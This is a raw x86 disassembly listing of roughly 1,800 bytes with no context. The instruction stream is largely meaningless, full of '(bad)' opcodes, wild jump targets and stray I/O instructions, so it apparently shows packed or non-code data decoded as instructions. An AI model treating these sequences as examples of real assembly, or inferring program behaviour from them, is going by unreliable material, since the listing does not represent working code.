  43e011:	jno    0x43e087
  43e013:	jmp    0xe59b4701
  43e018:	pop    ecx
  43e019:	pop    ebp
  43e01a:	inc    ebx
  43e01b:	hlt    
  43e01c:	push   ds
  43e01d:	push   0x0
  43e01f:	xor    eax,DWORD PTR [ebx]
  43e021:	ins    BYTE PTR es:[edi],dx
  43e022:	jae    0x43dfdc
  43e024:	dec    edi
  43e025:	pop    ebx
  43e026:	popa   
  43e027:	test   al,0xf4
  43e029:	(bad)  
  43e02a:	inc    DWORD PTR [eax]
  43e02c:	add    BYTE PTR [eax],al
  43e02e:	add    BYTE PTR [eax],al
  43e030:	mov    es,WORD PTR [eax]
  43e032:	dec    eax
  43e033:	gs in  eax,dx
  43e035:	push   ebp
  43e036:	dec    edx
  43e037:	gs dec ebp
  43e039:	pop    edx
  43e03a:	ins    BYTE PTR es:[edi],dx
  43e03b:	outs   dx,DWORD PTR ds:[esi]
  43e03c:	mov    edi,0x750241fe
  43e041:	call   0x5de954a4
  43e046:	push   ebp
  43e047:	pop    ebp
  43e048:	nop
  43e049:	cld    
  43e04a:	push   eax
  43e04b:	dec    eax
  43e04c:	pop    eax
  43e04d:	dec    edx
  43e04e:	push   esp
  43e04f:	add    BYTE PTR [ebp-0x35],dh
  43e052:	add    eax,DWORD PTR [ecx+0x58]
  43e055:	out    dx,eax
  43e056:	ds js  0x43e0a5
  43e059:	pop    ss
  43e05a:	inc    ecx
  43e05b:	imul   ebx,DWORD PTR [ecx-0x2],0x647682f
  43e062:	arpl   WORD PTR [ebp+esi*2-0x21],sp
  43e066:	(bad)  
  43e067:	imul   eax,DWORD PTR [esi-0x49],0x52
  43e06b:	pop    ebp
  43e06c:	and    BYTE PTR [ebx+0x47753f5b],bh
  43e072:	add    eax,DWORD PTR [ecx+0x18]
  43e075:	scas   eax,DWORD PTR es:[edi]
  43e076:	arpl   WORD PTR cs:[edi],sp
  43e079:	fcomp  QWORD PTR [ebx+0x69]
  43e07c:	and    ebx,DWORD PTR [esi+0x44]
  43e07f:	push   ecx
  43e080:	jne    0x43e0df
  43e082:	stc    
  43e083:	push   ecx
  43e084:	or     al,0xdd
  43e086:	dec    eax
  43e087:	jae    0x43e09d
  43e089:	iret   
  43e08a:	xor    esi,DWORD PTR [ebx-0x28]
  43e08d:	jge    0x43e0da
  43e08f:	inc    ebx
  43e090:	in     eax,dx
  43e091:	stos   DWORD PTR es:[edi],eax
  43e092:	cld    
  43e093:	mov    esp,0x0
  43e098:	add    BYTE PTR [esi-0x63],dh
  43e09b:	pop    edi
  43e09c:	pop    edi
  43e09d:	sar    DWORD PTR [ebx+0x52],1
  43e0a0:	imul   edx,esi,0xb86d517e
  43e0a6:	xchg   BYTE PTR [edi+0x69],dl
  43e0a9:	(bad)  
  43e0aa:	xchg   edx,eax
  43e0ab:	cld    
  43e0ac:	out    dx,eax
  43e0ad:	jno    0x43e048
  43e0af:	pop    ebx
  43e0b0:	outs   dx,BYTE PTR ds:[esi]
  43e0b1:	test   eax,0xc56c642e
  43e0b6:	cmp    eax,0x8c987456
  43e0bb:	dec    eax
  43e0bc:	inc    ebx
  43e0bd:	popf   
  43e0be:	add    ah,bh
  43e0c0:	add    ecx,esi
  43e0c2:	std    
  43e0c3:	xor    eax,0x4c2e984b
  43e0c8:	push   edi
  43e0c9:	test   eax,0xa15f3c2b
  43e0ce:	sub    DWORD PTR [ecx],ebp
  43e0d0:	pop    ebx
  43e0d1:	popa   
  43e0d2:	pop    ds
  43e0d3:	adc    ebx,DWORD PTR [ebx+0x5e]
  43e0d6:	pop    ds
  43e0d7:	out    0x3,eax
  43e0d9:	std    
  43e0da:	add    esp,DWORD PTR [edx]
  43e0dc:	pop    edi
  43e0dd:	popa   
  43e0de:	dec    esi
  43e0df:	adc    BYTE PTR [edi+0x56],dl
  43e0e2:	pop    esp
  43e0e3:	or     bl,BYTE PTR [edx+0x56]
  43e0e6:	dec    ebx
  43e0e7:	add    DWORD PTR [edx+0x4c],esp
  43e0ea:	xor    al,0xfc
  43e0ec:	bound  eax,QWORD PTR [ecx+0x2b]
  43e0ef:	adc    bl,BYTE PTR [edx+0x75]
  43e0f2:	add    ah,dh
  43e0f4:	add    eax,0x37fb1f34
  43e0f9:	or     al,0x25
  43e0fb:	or     BYTE PTR [eax+0x0],bl
  43e0fe:	add    BYTE PTR [eax],al
  43e100:	add    BYTE PTR [eax],al
  43e102:	inc    ecx
  43e103:	sub    edx,esp
  43e105:	pop    esi
  43e106:	jne    0x43e10a
  43e108:	and    al,0x0
  43e10a:	and    DWORD PTR [esi],esp
  43e10c:	(bad)  
  43e10d:	inc    edx
  43e10e:	adc    DWORD PTR [esi],esp
  43e110:	mov    edx,0x29027564
  43e115:	add    cl,cl
  43e117:	es mov dh,0x41
  43e11a:	fistp  DWORD PTR ds:0xff5103cc
  43e120:	nop
  43e121:	pop    edx
  43e122:	retf   
  43e123:	cs pushf 
  43e125:	(bad)  
  43e127:	inc    eax
  43e128:	xchg   ebp,eax
  43e129:	pop    esi
  43e12a:	(bad)  
  43e12b:	add    al,BYTE PTR [eax]
  43e12d:	add    BYTE PTR [edi-0x39b06ad7],ah
  43e133:	and    DWORD PTR [ebx-0x75d95ebe],edx
  43e139:	fs jne 0x43e13e
  43e13c:	add    dl,ch
  43e13e:	and    al,BYTE PTR [esi+0x63]
  43e141:	jl     0x43e100
  43e143:	xor    al,0x63
  43e145:	sub    eax,0x4a6328ae
  43e14a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e14b:	sub    DWORD PTR [esi+0x50],ebp
  43e14e:	inc    esp
  43e14f:	add    al,BYTE PTR [eax]
  43e151:	xor    DWORD PTR [ebp+0x45],esi
  43e154:	arpl   WORD PTR ds:0x4e6e28b2,di
  43e15a:	inc    ebx
  43e15b:	dec    ebx
  43e15c:	imul   ecx,DWORD PTR [ebp+0x42],0x775e0002
  43e163:	inc    ecx
  43e164:	arpl   WORD PTR ds:0x0,bx
  43e16a:	add    BYTE PTR [eax],bh
  43e16c:	sub    DWORD PTR [ebx+0x19],ebp
  43e16f:	cmp    ch,BYTE PTR [esi]
  43e171:	arpl   WORD PTR [ebx],bx
  43e173:	jg     0x43e1cc
  43e175:	imul   eax,DWORD PTR [esp+eax*4],0x2
  43e179:	add    ah,bh
  43e17b:	jns    0x43e1c6
  43e17d:	jo     0x43e183
  43e17f:	dec    edi
  43e180:	inc    ebx
  43e181:	jb     0x43e18f
  43e183:	aas    
  43e184:	cs push ecx
  43e186:	jmp    0xae425901
  43e18b:	xor    ebp,DWORD PTR [esi]
  43e18d:	cmp    eax,0x632820d4
  43e192:	(bad)  
  43e193:	xor    dl,BYTE PTR [edx+0x6e]
  43e196:	mov    esi,0xba6d2311
  43e19b:	scas   eax,DWORD PTR es:[edi]
  43e19c:	push   ds
  43e19d:	add    BYTE PTR [edx-0x53b5b755],dh
  43e1a3:	stos   BYTE PTR es:[edi],al
  43e1a4:	in     eax,0x2d
  43e1a6:	(bad)  
  43e1a7:	mov    edx,0x76e96c26
  43e1ac:	imul   edi,edi,0x7025afa4
  43e1b2:	mov    BYTE PTR [edx-0x646397ab],dh
  43e1b8:	and    eax,0x21fd006d
  43e1bd:	pop    ebp
  43e1be:	push   edi
  43e1bf:	sbb    al,0x3
  43e1c1:	sub    eax,DWORD PTR [edx]
  43e1c3:	cld    
  43e1c4:	push   edi
  43e1c5:	pop    ebp
  43e1c6:	imul   edi,ecx,0x57
  43e1c9:	imul   esi,DWORD PTR [ebx-0x43],0x57
  43e1cd:	pop    ebp
  43e1ce:	push   edi
  43e1cf:	add    BYTE PTR [eax],al
  43e1d1:	add    BYTE PTR [eax],al
  43e1d3:	add    BYTE PTR [ebx+eax*1],bl
  43e1d6:	cld    
  43e1d7:	add    al,BYTE PTR [eax+0x54]
  43e1da:	pop    ecx
  43e1db:	outs   dx,BYTE PTR ds:[esi]
  43e1dc:	lahf   
  43e1dd:	pop    edx
  43e1de:	pop    ecx
  43e1df:	je     0x43e222
  43e1e1:	stc    
  43e1e2:	pop    esp
  43e1e3:	jae    0x43e194
  43e1e5:	sbb    eax,0x2cc655f
  43e1ea:	sbb    al,0x2
  43e1ec:	jns    0x43e241
  43e1ee:	pop    edi
  43e1ef:	push   edi
  43e1f0:	jge    0x43e247
  43e1f2:	je     0x43e23a
  43e1f4:	jnp    0x43e24a
  43e1f6:	inc    ebp
  43e1f7:	jne    0x43e271
  43e1f9:	push   edx
  43e1fa:	popa   
  43e1fb:	jo     0x43e1b5
  43e1fd:	and    DWORD PTR [edi+0x62],eax
  43e200:	xchg   BYTE PTR [ecx],ah
  43e202:	pop    ebx
  43e203:	je     0x43e1b4
  43e205:	add    dh,BYTE PTR [esi+0x1]
  43e208:	push   ebx
  43e209:	and    DWORD PTR [ebx+edx*2-0x5b],esi
  43e20d:	push   ebx
  43e20e:	je     0x43e275
  43e210:	test   eax,0xae745cf9
  43e215:	push   ebp
  43e216:	pop    ebx
  43e217:	jae    0x43e1a5
  43e219:	add    bh,BYTE PTR ds:0x7421d301
  43e21f:	dec    esp
  43e220:	cmp    eax,0x3a497451
  43e225:	push   edx
  43e226:	ins    DWORD PTR es:[edi],dx
  43e227:	je     0x43e23e
  43e229:	push   eax
  43e22a:	pop    esi
  43e22b:	outs   dx,DWORD PTR ds:[esi]
  43e22c:	dec    esp
  43e22d:	add    bh,BYTE PTR [eax+eax*1]
  43e230:	pop    ds
  43e231:	pop    edx
  43e232:	pop    ecx
  43e233:	jb     0x43e236
  43e235:	push   edx
  43e236:	jo     0x43e29d
  43e238:	add    BYTE PTR [eax],al
  43e23a:	add    BYTE PTR [eax],al
  43e23c:	add    BYTE PTR [ebp-0x67],dh
  43e23f:	sub    DWORD PTR [eax],eax
  43e241:	jne    0x43e2b8
  43e243:	cld    
  43e244:	cmp    al,0x9d
  43e246:	mov    cl,BYTE PTR [esi+0x4c]
  43e249:	call   0xfcab:0xca6e602c
  43e250:	aaa    
  43e251:	jne    0x43e2bb
  43e253:	push   esp
  43e254:	pop    edi
  43e255:	xchg   edi,esi
  43e257:	push   eax
  43e258:	dec    ecx
  43e259:	nop
  43e25a:	inc    esi
  43e25b:	sub    DWORD PTR [eax],eax
  43e25d:	jne    0x43e25d
  43e25f:	std    
  43e260:	dec    eax
  43e261:	test   DWORD PTR [esi],edi
  43e263:	push   edx
  43e264:	push   ecx
  43e265:	pop    esp
  43e266:	dec    ebp
  43e267:	pusha  
  43e268:	imul   esp,DWORD PTR [edx+0x18],0x42695f50
  43e26f:	push   ecx
  43e270:	push   0x42
  43e272:	stos   DWORD PTR es:[edi],eax
  43e273:	cld    
  43e274:	test   BYTE PTR [esp+eiz*8+0x5e],dh
  43e278:	je     0x43e29a
  43e27a:	sbb    BYTE PTR [edi+0x6e],bl
  43e27d:	xor    cl,BYTE PTR [ecx]
  43e27f:	push   esi
  43e280:	arpl   WORD PTR [esi+0xf],dx
  43e283:	cmp    ebp,DWORD PTR [edx+0x1b]
  43e286:	or     al,0x4e
  43e288:	imul   edx,DWORD PTR [edi+ebp*4],0x5b
  43e28c:	imul   edx,DWORD PTR [ebx],0x77b60414
  43e292:	sbb    BYTE PTR [edi+0x74],bl
  43e295:	sub    ebx,edx
  43e297:	dec    esi
  43e298:	arpl   WORD PTR [edi+edi*4],dx
  43e29b:	cmp    BYTE PTR [ebx+0x6],ah
  43e29e:	ror    BYTE PTR [eax+0x69],0x0
  43e2a2:	add    BYTE PTR [eax],al
  43e2a4:	add    BYTE PTR [eax],al
  43e2a6:	add    eax,0x7545fcab
  43e2ab:	push   0xbee66950
  43e2b0:	cmp    BYTE PTR [ebx-0x1a],ah
  43e2b3:	ror    BYTE PTR [eax+0x69],0xe5
  43e2b7:	stos   DWORD PTR es:[edi],eax
  43e2b8:	cld    
  43e2b9:	daa    
  43e2ba:	ja     0x43e2be
  43e2bc:	mov    dl,0x53
  43e2be:	(bad)  
  43e2bf:	and    al,0xa3
  43e2c1:	pusha  
  43e2c2:	shr    BYTE PTR [ecx],1
  43e2c4:	fwait
  43e2c5:	push   esi
  43e2c6:	lds    ecx,FWORD PTR [ebp-0x19]
  43e2c9:	add    ebx,DWORD PTR [ebp-0x5e9f55fd]
  43e2cf:	push   edx
  43e2d0:	jne    0x43e328
  43e2d2:	rcr    BYTE PTR [edi],0x76
  43e2d5:	push   edx
  43e2d6:	les    ebp,FWORD PTR [ebx]
  43e2d8:	jns    0x43e339
  43e2da:	pushf  
  43e2db:	sub    eax,0x2eaa5036
  43e2e0:	push   eax
  43e2e1:	push   ebp
  43e2e2:	pop    DWORD PTR [edx]
  43e2e4:	push   edi
  43e2e5:	add    al,0x38
  43e2e7:	xor    BYTE PTR [ebx+eiz*2+0x69],al
  43e2eb:	pop    ds
  43e2ec:	sbb    bl,BYTE PTR [ebx+0x5f]
  43e2ef:	push   ds
  43e2f0:	dec    edx
  43e2f1:	dec    ebp
  43e2f2:	xor    BYTE PTR [esi],ch
  43e2f4:	dec    eax
  43e2f5:	push   eax
  43e2f6:	push   edx
  43e2f7:	and    eax,0x2752d39
  43e2fc:	xor    DWORD PTR [eax+ecx*4],eax
  43e2ff:	or     dl,BYTE PTR es:[ecx+0x56]
  43e303:	dec    ebp
  43e304:	add    BYTE PTR [esi+0x51],dl
  43e307:	and    eax,0x3112
  43e30c:	add    BYTE PTR [eax],al
  43e30e:	add    BYTE PTR [ecx],ch
  43e310:	and    edi,ebx
  43e312:	pop    edx
  43e313:	sbb    al,0x24
  43e315:	out    0x3,eax
  43e317:	and    eax,DWORD PTR [ebx]
  43e319:	sub    bl,BYTE PTR [edi+0x21]
  43e31c:	dec    esi
  43e31d:	call   DWORD PTR [ecx+0x16]
  43e320:	and    ecx,ebx
  43e322:	aas    
  43e323:	push   ss
  43e324:	xor    esi,ecx
  43e326:	dec    edi
  43e327:	or     al,0x32
  43e329:	out    0x3,eax
  43e32b:	sar    edi,cl
  43e32d:	mov    ch,0x5e
  43e32f:	jmp    0xc8989886
  43e334:	sbb    eax,0x29c450b6
  43e339:	add    bh,al
  43e33b:	mov    edx,0xc29a7129
  43e340:	push   ebx
  43e341:	je     0x43e2d3
  43e343:	mov    eax,ds:0x76bf0028
  43e348:	cmc    
  43e349:	ins    DWORD PTR es:[edi],dx
  43e34a:	mov    edi,ss
  43e34c:	arpl   WORD PTR cs:[ebp+0x7d6525d3],sp
  43e353:	shl    DWORD PTR [edx],0x51
  43e356:	jmp    0xae426bd1
  43e35b:	mov    ebx,0xa880512e
  43e360:	push   ds
  43e361:	imul   ebx,DWORD PTR [esi+0x71],0xa239fe2d
  43e368:	sub    BYTE PTR [esp-0x66],ah
  43e36c:	and    eax,0x1f50486d
  43e371:	push   esp
  43e372:	push   eax
  43e373:	add    BYTE PTR [eax],al
  43e375:	add    BYTE PTR [eax],al
  43e377:	add    BYTE PTR [edx+0x1f],al
  43e37a:	imul   esi,DWORD PTR [eax*2+0x74ad0051],0xa0356345
  43e385:	sbb    ebp,DWORD PTR [edx+0xd]
  43e388:	and    BYTE PTR [ecx],dh
  43e38a:	dec    esp
  43e38b:	push   cs
  43e38c:	sub    esp,DWORD PTR [ecx]
  43e38e:	push   ecx
  43e38f:	jmp    0x3b42030a
  43e394:	push   edx
  43e395:	arpl   WORD PTR es:[eax],cx
  43e398:	inc    esp
  43e399:	pop    ds
  43e39a:	inc    esp
  43e39b:	sub    bh,BYTE PTR [ecx-0x70]
  43e39e:	(bad)  
  43e39f:	sub    eax,0x512e3a
  43e3a4:	sub    ebx,DWORD PTR [esi]
  43e3a6:	imul   ebx,esi,0xc66a2942
  43e3ac:	push   ecx
  43e3ad:	add    al,BYTE PTR [eax]
  43e3af:	or     BYTE PTR [esi+0x41],dh
  43e3b2:	arpl   bp,dx
  43e3b4:	mov    dl,0xf5
  43e3b6:	(bad)  
  43e3b7:	inc    DWORD PTR [eax+0x32694f01]
  43e3bd:	push   ebx
  43e3be:	addr16 ja 0x43e3cb
  43e3c1:	push   ecx
  43e3c2:	ins    DWORD PTR es:[di],dx
  43e3c4:	in     al,dx
  43e3c5:	dec    ebp
  43e3c6:	popa   
  43e3c7:	outs   dx,BYTE PTR ds:[esi]
  43e3c8:	call   0x1045cacb
  43e3cd:	dec    esi
  43e3ce:	pop    ecx
  43e3cf:	fs adc eax,0xf967594c
  43e3d5:	in     eax,0xff
  43e3d7:	call   FWORD PTR [ecx+0x653f00]
  43e3dd:	add    BYTE PTR [eax],al
  43e3df:	add    BYTE PTR [eax],al
  43e3e1:	test   al,0xe3
  43e3e3:	data16 jo 0x43e3e1
  43e3e6:	push   edi
  43e3e7:	fs xchg bx,ax
  43e3ea:	inc    esi
  43e3eb:	add    BYTE PTR [eax],al
  43e3ed:	enter  0x40fc,0x73
  43e3f1:	ds jmp 0xf18d5851
  43e3f7:	outs   dx,DWORD PTR ds:[esi]
  43e3f8:	je     0x43e43f
  43e3fa:	(bad)  
  43e3fb:	mov    ds:0x73e99b01,eax
  43e400:	push   edi
  43e401:	inc    ebp
  43e402:	lock arpl WORD PTR [edi-0x65],bp
  43e406:	pop    edx
  43e407:	push   0x63dd3972
  43e40c:	push   eax
  43e40d:	outs   dx,BYTE PTR ds:[esi]
  43e40e:	out    dx,eax
  43e40f:	pop    edx
  43e410:	gs pop edi
  43e412:	jmp    0x43e454
  43e414:	fs int3 
  43e416:	(bad)  
  43e417:	push   edx
  43e418:	add    DWORD PTR [ebx-0x17],ebx
  43e41b:	jae    0x43e46a
  43e41d:	jns    0x43e40a
  43e41f:	push   0x61
  43e421:	jnp    0x43e40c
  43e423:	dec    edi
  43e424:	outs   dx,DWORD PTR ds:[esi]
  43e425:	lahf   
  43e426:	inc    BYTE PTR [eax]
  43e428:	add    dh,BYTE PTR [ecx-0x23]
  43e42b:	outs   dx,DWORD PTR ds:[esi]
  43e42c:	push   edi
  43e42d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e42e:	lock arpl WORD PTR [edi-0x55],bp
  43e432:	dec    esi
  43e433:	imul   esi,DWORD PTR [di-0x45],0xbf756d30
  43e43b:	add    cl,BYTE PTR [ebp-0x30]
  43e43e:	fldenv [eax]
  43e440:	dec    ebx
  43e441:	fsubr  DWORD PTR [ecx+esi*1+0x5f]
  43e445:	add    BYTE PTR [eax],al
  43e447:	add    BYTE PTR [eax],al
  43e449:	add    dl,dl
  43e44b:	mov    esi,0xc7750055
  43e450:	add    cl,BYTE PTR [esi-0x30]
  43e453:	xchg   edi,eax
  43e454:	daa    
  43e455:	pop    edi
  43e456:	mov    BYTE PTR [esi-0x703aa0bf],0x37
  43e45d:	outs   dx,BYTE PTR ds:[esi]
  43e45e:	cwde   
  43e45f:	fwait
  43e460:	cld    
  43e461:	aam    0x74
  43e463:	jb     0x43e496
  43e465:	push   ecx
  43e466:	mov    WORD PTR [ecx-0x645d96e0],es
  43e46c:	cld    
  43e46d:	pop    ds
  43e46e:	je     0x43e4d8
  43e470:	daa    
  43e471:	je     0x43e429
  43e473:	dec    esi
  43e474:	xor    ch,BYTE PTR [ebp-0x6e]
  43e477:	dec    ebp
  43e478:	push   esp
  43e479:	imul   eax,DWORD PTR [esi+0x77c1fc9b],0x427426ec
  43e483:	push   edx
  43e484:	cs fs push edx
  43e487:	clc    
  43e488:	push   ebx
  43e489:	imul   esp,DWORD PTR [esi-0x65],0xb772dfc
  43e490:	daa    
  43e491:	arpl   WORD PTR [esi-0xa],bx
  43e494:	es ins DWORD PTR es:[edi],dx
  43e496:	inc    esi
  43e497:	cli    
  43e498:	and    al,0x63
  43e49a:	xor    al,0x9b
  43e49c:	cld    
  43e49d:	add    esi,DWORD PTR [eax+ebp*8+0x26]
  43e4a1:	je     0x43e4d7
  43e4a3:	sbb    DWORD PTR [ecx],esp
  43e4a5:	arpl   WORD PTR [esi],sp
  43e4a7:	mov    bh,0x2d
  43e4a9:	outs   dx,BYTE PTR ds:[esi]
  43e4aa:	jne    0x43e4d1
  43e4ac:	add    ecx,DWORD PTR [ebp+0x0]
  43e4af:	add    BYTE PTR [eax],al
  43e4b1:	add    BYTE PTR [eax],al
  43e4b3:	sbb    BYTE PTR [edi+0x2077341],dh
  43e4b9:	(bad)  
  43e4ba:	xor    dl,BYTE PTR [ebx]
  43e4bc:	push   edx
  43e4bd:	retf   0x7536
  43e4c0:	add    bl,bh
  43e4c2:	add    al,0xb4
  43e4c4:	daa    
  43e4c5:	rol    DWORD PTR [esi-0x36],cl
  43e4c8:	xor    bh,BYTE PTR [ebx-0x18d82cc8]
  43e4ce:	add    eax,DWORD PTR [ebp-0x36d755fd]
  43e4d4:	inc    ebp
  43e4d5:	mov    ebx,0xb335d824
  43e4da:	xor    cl,bh
  43e4dc:	sub    DWORD PTR [edx-0x55fd1efd],esi
  43e4e2:	sub    BYTE PTR [ecx-0x6ece7fa7],ch
  43e4e8:	and    DWORD PTR [edx+0x4c],edi
  43e4eb:	(bad)
  43e4ef:	xchg   ecx,eax
  43e4f0:	add    ebp,DWORD PTR [edx-0x77ad76d8]
  43e4f6:	xor    eax,0x45b2096
  43e4fb:	inc    edi
  43e4fc:	add    al,0x37
  43e4fe:	xor    DWORD PTR [eax+0x60272436],ecx
  43e504:	xor    eax,0x59562948
  43e509:	out    0x3,eax
  43e50b:	cmc    
  43e50c:	add    edx,DWORD PTR [esi]
  43e50e:	daa    
  43e50f:	popa   
  43e510:	inc    ebp
  43e511:	dec    eax
  43e512:	xor    al,0x49
  43e514:	aaa    
  43e515:	xor    eax,0x27
  43e51a:	add    BYTE PTR [eax],al
  43e51c:	jne    0x43e520
  43e51e:	inc    esp
  43e51f:	add    esi,DWORD PTR [edi+eiz*1]
  43e522:	adc    ecx,DWORD PTR [edi+0x56]
  43e525:	xor    eax,0x27142316
  43e52a:	xor    al,BYTE PTR [ecx+ecx*1]
  43e52d:	add    ebp,DWORD PTR [edx]
  43e52f:	daa    
  43e530:	sub    DWORD PTR [ecx+0x10],ebx
  43e533:	xor    dl,BYTE PTR [ecx]
  43e535:	and    DWORD PTR [eax],eax
  43e537:	(bad)  
  43e538:	sub    BYTE PTR ds:0x5976f55d,ah
  43e53e:	jmp    FWORD PTR [ebp-0x3bb4c9a5]
  43e544:	inc    ecx
  43e545:	pop    ds
  43e546:	pop    edi
  43e547:	into   
  43e548:	fwait
  43e549:	out    dx,eax
  43e54a:	jmp    eax
  43e54c:	jo     0x43e589
  43e54e:	pop    edi
  43e54f:	mov    ecx,0xb56e27bc
  43e554:	mov    ds:0x9ba26c4f,eax
  43e559:	aaa    
  43e55a:	push   ecx
  43e55b:	jmp    0xbd4182d6
  43e560:	test   DWORD PTR [ebx+0x6a],edx
  43e563:	nop
  43e564:	xchg   ecx,eax
  43e565:	sbb    DWORD PTR [esp+ecx*4+0x76],esp
  43e569:	adc    al,0xff
  43e56b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e56c:	push   ebx
  43e56d:	ss cmp eax,0x5e324f95
  43e573:	mov    ss,WORD PTR [edi+0x20]
  43e576:	lods   eax,DWORD PTR fs:[esi]
  43e578:	push   edi
  43e579:	ss pop edi
  43e57b:	jmp    0x2e42d5f6
  43e580:	add    BYTE PTR [eax],al
  43e582:	add    BYTE PTR [eax],al
  43e584:	add    BYTE PTR [edx+0x36],bl
  43e587:	inc    ebp
  43e588:	inc    esp
  43e589:	ds push eax
  43e58b:	imul   ecx,DWORD PTR [eax-0x55],0x96554d26
  43e592:	ss arpl cx,bp
  43e595:	jbe    0x43e525
  43e597:	jmp    DWORD PTR [edx+edx*4]
  43e59a:	and    al,0x51
  43e59c:	inc    eax
  43e59d:	xchg   DWORD PTR [esi],esp
  43e59f:	imul   esi,DWORD PTR [esi],0xa692021
  43e5a5:	sbb    al,0x2
  43e5a7:	add    bl,ah
  43e5a9:	jo     0x43e5fd
  43e5ab:	outs   dx,BYTE PTR ds:[esi]
  43e5ac:	add    BYTE PTR [edi+0x36],ah
  43e5af:	push   ecx
  43e5b0:	add    BYTE PTR [edi+0x26],ah
  43e5b3:	imul   eax,DWORD PTR [eax],0xeb03a3
  43e5b9:	push   ecx
  43e5ba:	rep ins BYTE PTR es:[edi],dx
  43e5bc:	popa   
  43e5bd:	js     0x43e617
  43e5bf:	pop    ebp
  43e5c0:	arpl   WORD PTR [eax-0x43fdcefd],ax
  43e5c6:	repnz push 0x74
  43e5c9:	rcr    bl,0x69
  43e5cc:	gs cmp eax,0x4f6544e7
  43e5d2:	neg    BYTE PTR [eax+0x67]
  43e5d5:	xor    DWORD PTR [edx+0x0],ecx
  43e5d8:	add    BYTE PTR [esi+0x3],ch
  43e5db:	aas    
  43e5dc:	adc    BYTE PTR gs:[edi+0x3b],al
  43e5e0:	inc    ebp
  43e5e1:	add    al,0x3
  43e5e3:	mov    ch,0x1
  43e5e5:	add    eax,0x6573f1
  43e5ea:	add    BYTE PTR [eax],al
  43e5ec:	add    BYTE PTR [eax],al
  43e5ee:	fdivrp st(5),st
  43e5f0:	pop    esp
  43e5f1:	arpl   WORD PTR [eax],dx
  43e5f3:	push   ebp
  43e5f4:	pop    ebp
  43e5f5:	arpl   WORD PTR [eax],ax
  43e5f7:	add    edi,DWORD PTR [edi+0x1]
  43e5fa:	shl    edi,cl
  43e5fc:	jae    0x43e653
  43e5fe:	pushf  
  43e5ff:	out    0x58,eax
  43e601:	je     0x43e604
  43e603:	push   ebp
  43e604:	pop    ebp
  43e605:	arpl   WORD PTR [eax+0x4e000603],ax
  43e60b:	fstp   DWORD PTR [esi+0x69]
  43e60e:	stos   BYTE PTR es:[edi],al
  43e60f:	push   esi
  43e610:	pop    ecx
  43e611:	imul   edi,DWORD PTR [edx],0x1fffffea
  43e617:	push   es
  43e618:	inc    esp
  43e619:	jb     0x43e648
  43e61b:	idiv   DWORD PTR [esp+eiz*2]
  43e61e:	xor    ebx,ecx
  43e620:	(bad)  
  43e621:	call   DWORD PTR [edx]
  43e623:	push   es
  43e624:	imul   ecx,DWORD PTR ds:[eax+0x6f6549f2],0x3effffea
  43e62f:	add    eax,0xd75653f
  43e634:	push   ecx
  43e635:	sbb    eax,DWORD PTR [di]
  43e638:	sub    DWORD PTR [ecx+0x39],esi
  43e63b:	fadd   QWORD PTR [ebx]
  43e63d:	mov    BYTE PTR [eax+ebp*8+0x26],dh
  43e641:	je     0x43e66b
  43e643:	test   eax,0x6015f20
  43e648:	dec    esi
  43e649:	popa   
  43e64a:	adc    ebx,DWORD PTR [ecx+0x6675dbfc]
  43e650:	sub    ah,BYTE PTR [eax+eax*1+0x0]
  43e654:	add    BYTE PTR [eax],al
  43e656:	add    ch,al
  43e658:	mov    edx,0x9be16a2b
  43e65d:	cld    
  43e65e:	and    al,0x75
  43e660:	pop    eax
  43e661:	and    al,0x5f
  43e663:	out    0x5f,eax
  43e665:	sub    DWORD PTR [ecx-0x28],esi
  43e668:	imul   eax,DWORD PTR [ebx+0x0],0x4303f675
  43e66f:	mov    ebp,0xcc513092
  43e674:	jge    0x43e696
  43e676:	imul   ebp,DWORD PTR [edx+0x75784788],0x984103c8
  43e680:	das    
  43e681:	dec    esp
  43e682:	pop    ebp
  43e683:	mov    bh,BYTE PTR [ebp+0x4b]
  43e686:	push   0xffffff9b
  43e688:	test   ah,bh
  43e68a:	shl    BYTE PTR [ebp+0x67],0x2e
  43e68e:	pop    edi
  43e68f:	mov    dh,dl
  43e691:	sbb    al,0x69
  43e693:	mov    ebx,DWORD PTR [ebx-0x1688bb04]
  43e699:	es popa 
  43e69b:	pop    esp
  43e69c:	dec    eax
  43e69d:	cmp    BYTE PTR [ebx+0x67],ah
  43e6a0:	fsubr  DWORD PTR [edi]
  43e6a2:	pop    edi
  43e6a3:	callw  0xe6e9
  43e6a7:	jne    0x43e6f5
  43e6a9:	std    
  43e6aa:	inc    ebx
  43e6ab:	push   eax
  43e6ac:	inc    ebp
  43e6ad:	inc    edx
  43e6ae:	outs   dx,BYTE PTR ds:[esi]
  43e6af:	push   esp
  43e6b0:	add    dl,BYTE PTR [ecx+ebp*1]
  43e6b3:	and    eax,0x44230a30
  43e6b8:	add    dh,cl
  43e6ba:	add    eax,DWORD PTR [eax]
  43e6bc:	add    BYTE PTR [eax],al
  43e6be:	add    BYTE PTR [eax],al
  43e6c0:	push   0x442ffb23
  43e6c5:	sbb    edx,DWORD PTR [ecx]
  43e6c7:	sub    BYTE PTR [esi*1+0x211c3217],cl
  43e6ce:	sbb    al,BYTE PTR [esi+ebp*2]
  43e6d1:	add    ah,BYTE PTR [esi]
  43e6d3:	and    eax,0x2cba1e11
  43e6d8:	mov    tr1,edx
  43e6db:	lds    esi,FWORD PTR ss:[eax]
  43e6de:	ret    0xaa22
  43e6e1:	add    bl,BYTE PTR [ecx-0x35d84cff]
  43e6e7:	sub    al,0xc8
  43e6e9:	les    esi,FWORD PTR ss:[ecx]
  43e6ec:	nop
  43e6ed:	push   ds
  43e6ee:	enter  0xd832,0x55
  43e6f2:	out    0x3,eax
  43e6f4:	fld    QWORD PTR [ecx]
  43e6f6:	stos   DWORD PTR es:[edi],eax
  43e6f7:	sub    bh,dl
  43e6f9:	aas    
  43e6fa:	mov    ds:0x801a704c,eax
  43e6ff:	das    
  43e700:	xchg   ecx,eax
  43e701:	push   edx
  43e702:	xchg   ebp,eax
  43e703:	rol    BYTE PTR cs:[ebx-0x19],0x3
  43e708:	add    DWORD PTR [edx],eax
  43e70a:	mov    ds:0x83469728,eax
  43e70f:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  43e711:	xor    BYTE PTR [edx+0x22],bh
  43e714:	inc    edx
  43e715:	add    cl,bh
  43e717:	add    ch,BYTE PTR [eax+0x50385035]
  43e71d:	sbb    ch,BYTE PTR [ebx]
  43e71f:	daa    
  43e720:	pop    eax
